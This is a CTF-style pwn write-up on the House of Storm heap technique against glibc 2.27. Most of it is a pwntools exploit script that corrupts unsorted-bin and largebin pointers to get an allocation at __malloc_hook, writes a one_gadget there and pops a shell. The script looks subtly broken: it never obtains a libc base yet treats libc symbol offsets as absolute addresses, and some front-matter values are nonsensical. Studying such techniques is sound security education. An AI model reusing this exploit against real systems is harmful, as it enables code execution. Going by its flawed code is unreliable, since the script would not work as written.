---
title: "House of Storm — Arbitrary Allocation via Unsorted Bin and Largebin Attacks"
ctf: "heap"
category: "pwn"
difficulty: "easy"
points: null
date: "2026-06-25"
lat: 60.71
lng: 1700
summary: "Combining an unsorted bin corruption with a largebin `bk_nextsize` write to forge a valid fake chunk and turn a heap leak into an arbitrary allocation on glibc 2.27."
tags:
  - "heap"
  - "unsortedbin"
  - "largebin"
  - "house-of-storm"
  - "glibc-2.27"
---

```python
#!/usr/bin/env python3
from pwn import *
import os


exe = ELF("./house_of_storm")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.binary = exe
context.arch = "amd64"

ONE_GADGET = 0x10a38c  


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)
    return r


def malloc(idx, size):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Index: ", str(idx).encode())
    r.sendlineafter(b"Size: ", str(size).encode())
    r.recvuntil(b"addr: ")
    return int(r.recvline().strip(), 16)


def calloc(idx, size):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"Index: ", str(idx).encode())
    r.sendlineafter(b"Size: ", str(size).encode())
    r.recvuntil(b"addr: ")
    return int(r.recvline().strip(), 16)


def free(idx):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"Index: ", str(idx).encode())


def edit(idx, off, data):
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b"Index: ", str(idx).encode())
    r.sendlineafter(b"Offset: ", str(off).encode())
    r.sendlineafter(b"Length: ", str(len(data)).encode())
    r.sendafter(b"Data: ", data)


def show(idx, off, length):
    r.sendlineafter(b"> ", b"5")
    r.sendlineafter(b"Index: ", str(idx).encode())
    r.sendlineafter(b"Offset: ", str(off).encode())
    r.sendlineafter(b"Length: ", str(length).encode())
    return r.recvline()[:-1]


def get_shift_amount(ptr):
    # this leak can be 5 or 6 bytes above 0x20
    # we use the upper bytes for the fake size trick
    shift = 0
    while ptr > 0x20:
        ptr >>= 8
        shift += 1
    if shift == 0:
        return 0
    return shift - 1


def attempt():
    global r
    r = conn()
```

 
    Ok, first thing we need is heap leak.
    This trick is literally cooking the fake size from heap bytes,
    so no leak, no fake chunk, no storm, no fun.

```python
    heap_leak = malloc(0, 0x18)
    log.info(f"heap leak: {hex(heap_leak)}")
```


    Now we cook alloc_size from the heap address.
    The idea is simple: take the upper bytes of the leak and turn them
    into something that looks like a valid chunk size, so when calloc
    touches it later glibc does not instantly explode.
```python
    shift = get_shift_amount(heap_leak)
    alloc_size = (heap_leak >> (8 * shift))
    alloc_size = (alloc_size & 0xFFFFFFFFE) - 0x10
    log.info(f"shift={shift}, alloc_size={hex(alloc_size)}")
```

    If these bits are bad, just retry.
    This is one of those annoying little details from the technique,
    and if the size looks wrong here the fake chunk will die later anyway.

```python
    if (alloc_size & 0x8) != 0 or ((alloc_size & 0x4) == 0x4 and (alloc_size & 0x2) != 0x2):
        log.warning("bad alloc_size bits, retrying...")
        r.close()
        return False
```
   
    Now we set the stage.
    chunkA will stay as the unsorted victim, and chunkB is the bigger one
    that will later get pushed into largebin when malloc starts sorting.
```python
    chunkA = malloc(1, 0x4e8)
    malloc(2, 0x18)          
    chunkB = malloc(3, 0x4d8)
    malloc(4, 0x18)          
```
    
    Free both so they go unsorted first.
    Then we call malloc again so glibc does the bin dance for us and moves
    chunkB into largebin while chunkA is left alone in unsorted.

```python
    free(3)
    free(1)
    malloc(5, 0x4e8)  # this triggers sorting of chunkB into largebin
    free(5)           # chunkA is back in unsorted alone


    # if alloc is small, tcache will eat it so drain it first
    if alloc_size < 0x410:
        for i in range(7):
            malloc(6 + i, alloc_size)
        for i in range(7):
            free(6 + i)
```
   
    Now the unsorted part.
    We want the fake chunk header at __malloc_hook - 0x10.
    That way when the unsorted path does the bk write, it points straight
    on our fake chunk instead of a normal heap address.
```python
    target = libc.symbols["__malloc_hook"]
    fake_chunk = target - 0x10
    edit(1, 0x8, p64(fake_chunk))
```
    
    Now the largebin part on chunkB.
    bk_nextsize is the pointer glibc will follow during sorting, and then
    it writes a heap pointer into the fake chunk header area.
    That write is the thing that makes the fake header look more legit
    for malloc later.
```python
    bkns_target = fake_chunk - 0x18 - shift
    edit(3, 0x18, p64(bkns_target))
```
   
    Now we trigger calloc.
    This is where the two attacks meet: unsorted chooses where the write
    goes, and largebin chooses what bytes land there.
    After that, calloc can hand us the fake chunk back.
```python
    ptr = calloc(6, alloc_size)
    log.info(f"calloc returned: {hex(ptr)}, target: {hex(target)}")

    # now we got overlap and can hit __malloc_hook
    edit(6, target - ptr, p64(ONE_GADGET))

    # last step, trigger it
    malloc(7, 0x10)
    r.interactive()
    return True


def main():
    for _ in range(30):
        try:
            if attempt():
                return
        except (EOFError, Exception):
            try:
                r.close()
            except Exception:
                pass

    log.failure("all attempts failed")


if __name__ == "__main__":
    main()
```